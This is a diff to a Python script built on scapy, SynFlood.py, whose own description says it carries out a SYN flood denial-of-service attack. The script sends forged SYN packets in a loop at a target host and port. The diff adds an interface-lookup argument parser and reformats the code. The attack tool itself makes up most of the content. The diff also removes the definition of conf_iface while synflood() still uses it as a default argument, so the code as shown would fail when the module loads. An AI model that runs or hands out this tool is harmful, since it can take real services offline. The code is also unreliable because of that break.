@@ -50,7 +50,7 @@ KeyboardInterrupt
 [2016-06-22 12:35:25] CRITICAL (50) {__main__ - SynFlood.py:199} End of the SynFlood attack.
 """
 
-__version__ = "1.0.1"
+__version__ = "1.1.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -72,21 +72,100 @@ __copyright__ = copyright
 
 __all__ = ["main", "synflood"]
 
-from scapy.all import IP, TCP, RandIP, RandShort, Raw, Ether, send, conf, IFACES
-from logging import StreamHandler, Formatter, Logger
+from scapy.all import (
+    IP,
+    TCP,
+    RandIP,
+    RandShort,
+    Raw,
+    Ether,
+    send,
+    conf,
+    IFACES,
+)
+from logging import StreamHandler, Formatter, Logger, getLogger, DEBUG, WARNING
 from argparse import ArgumentParser, Namespace
 from scapy.interfaces import NetworkInterface
-from logging import getLogger, DEBUG, WARNING
 from collections.abc import Callable
 from functools import partial
 from sys import exit, stdout
 from platform import system
+from typing import List
 
-conf_iface: NetworkInterface = conf.iface
 IS_LINUX: bool = system() == "Linux"
 
 if IS_LINUX:
     from socket import socket, SOCK_RAW, AF_PACKET
+
+
+class ScapyArguments(ArgumentParser):
+
+    """
+    This class implements ArgumentsParser with
+    interface argument and iface research.
+    """
+
+    interface_args: list = ["--interface", "-i"]
+    interface_kwargs: dict = {
+        "help": "Part of the IP, MAC or name of the interface",
+    }
+
+    def __init__(
+        self,
+        *args,
+        interface_args=interface_args,
+        interface_kwargs=interface_kwargs,
+        **kwargs,
+    ):
+        super().__init__(*args, **kwargs)
+        self.interface_args = interface_args
+        self.interface_kwargs = interface_kwargs
+        self.add_argument(*interface_args, **interface_kwargs)
+
+    def parse_args(
+        self, args: List[str] = None, namespace: Namespace = None
+    ) -> Namespace:
+
+        """
+        This function implements the iface
+        research from interface arguments.
+        """
+
+        namespace: Namespace = ArgumentParser.parse_args(self, args, namespace)
+
+        argument_name: str = max(self.interface_args, key=len)
+        for char in self.prefix_chars:
+            if char == argument_name[0]:
+                argument_name = argument_name.lstrip(char)
+                break
+
+        interface = getattr(namespace, argument_name, None)
+
+        if interface is not None:
+            interface = interface.casefold()
+
+            for temp_iface in IFACES.values():
+
+                ip = temp_iface.ip
+                mac = temp_iface.mac or ""
+                name = temp_iface.name or ""
+                network_name = temp_iface.network_name or ""
+
+                mac = mac.casefold()
+                name = name.casefold()
+                network_name = network_name.casefold()
+
+                if (
+                    (ip and interface in ip)
+                    or (mac and interface in mac)
+                    or (name and interface in name)
+                    or (network_name and interface in network_name)
+                ):
+                    namespace.iface = temp_iface
+                    return namespace
+
+        namespace.iface = conf.iface
+        return namespace
 
 
 def get_custom_logger() -> Logger:
@@ -111,18 +190,25 @@ def get_custom_logger() -> Logger:
 
     return logger
 
+
 def parse() -> Namespace:
 
     """
     This function parses command line arguments.
     """
 
-    parser = ArgumentParser(description="This script implements a SynFlood attack.")
+    parser = ScapyArguments(
+        description="This script implements a SynFlood attack."
+    )
     parser_add_argument = parser.add_argument
     parser_add_argument("target", help="Target IP or hostname.")
-    parser_add_argument("--dport", "-p", help="Destination port.", default=80, type=int)
+    parser_add_argument(
+        "--dport", "-p", help="Destination port.", default=80, type=int
+    )
     parser_add_argument("--source", "-s", help="Source IP.", default=None)
-    parser_add_argument("--sport", "-P", help="Source port.", default=None, type=int)
+    parser_add_argument(
+        "--sport", "-P", help="Source port.", default=None, type=int
+    )
     parser_add_argument("--data", "-d", help="Additional data", default=None)
     parser_add_argument(
         "--verbose",
@@ -130,15 +216,17 @@ def parse() -> Namespace:
         help="Mode verbose (print debug message)",
         action="store_true",
     )
-    parser_add_argument(
-        "--interface",
-        "-i",
-        help="Part of the IP, MAC or name of the interface",
-    )
     return parser.parse_args()
 
 
-def synflood(target: str, dport: int, source: str, sport: int, data: bytes=None, iface: NetworkInterface = conf_iface) -> None:
+def synflood(
+    target: str,
+    dport: int,
+    source: str,
+    sport: int,
+    data: bytes = None,
+    iface: NetworkInterface = conf_iface,
+) -> None:
 
     """
     This function implements the SynFlood attack.
@@ -159,7 +247,7 @@ def synflood(target: str, dport: int, source: str, sport: int, data: bytes=None,
     logger_debug("Add raw data...")
     if data:
         packet = packet / Raw(data)
-        
+
     if IS_LINUX:
         logger_debug("Get packet as bytes...")
         packet = bytes(packet)
@@ -176,29 +264,15 @@ def main() -> int:
     """
 
     arguments = parse()
+    iface = arguments.iface
     run = True
 
     logger.setLevel(DEBUG if arguments.verbose else WARNING)
     logger_debug("Logging is configured.")
 
-    iface = conf.iface
-    if arguments.interface is not None:
-        for iface_ in IFACES.values():
-            if (
-                arguments.interface in iface_.ip
-                or arguments.interface in iface_.mac
-                or arguments.interface in iface_.network_name
-            ):
-                logger_info(
-                    "Interface argument match with "
-                    f"({iface_.ip} {iface_.mac} {iface_.name})"
-                )
-                iface = iface_
-                break
-
     logger_info(
         f"Network interface is configured (IP: {iface.ip}, MAC:"
-        f" {iface.mac} and name: {iface.name})"
+        f" {iface.mac} and name: {iface.name} or {iface.network_name})"
     )
 
     data = arguments.data
@@ -212,14 +286,17 @@ def main() -> int:
                 data.encode() if data else None,
                 iface=iface,
             )
-        #except OSError:
+        # except OSError:
         #    print("OSError...")
         except KeyboardInterrupt:
             run = False
-            logger_warning("KeyboardInterrupt is raised, stop the SynFlood attack...")
+            logger_warning(
+                "KeyboardInterrupt is raised, stop the SynFlood attack..."
+            )
 
     logger_critical("End of the SynFlood attack.")
     return 0
+
 
 logger: Logger = get_custom_logger()
 logger_debug: Callable = logger.debug
